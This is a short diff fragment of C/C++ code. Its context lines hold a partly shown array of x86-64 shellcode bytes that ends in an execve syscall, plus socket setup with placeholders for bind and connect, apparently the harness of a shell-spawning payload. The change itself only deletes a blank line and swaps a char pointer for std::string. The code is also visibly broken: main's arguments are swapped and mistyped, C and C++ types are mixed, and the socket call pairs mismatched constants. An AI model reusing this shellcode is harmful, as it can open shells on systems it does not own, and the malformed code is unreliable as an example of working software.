@@ -20,7 +20,6 @@ unsigned char code[] =  "\x48\x31\xc0\x48\x31\xd2\x50\x6a"
 "\x48\x89\xe6\x48\x83\xc0\x3b\x0f"
 "\x05";
 
-
 int codelength = sizeof(code);
 
 int main(char ** argv[], int * argc)  
@@ -29,7 +28,7 @@ int main(char ** argv[], int * argc)
     int ipv4 = socket(AF_UNSPEC, SOCK_PACKET, 0);
     
     // address structure
-    char * address;
+    std::string address;
     struct hostent* host;
 
     int set, conn; // bind and connect placeholders.
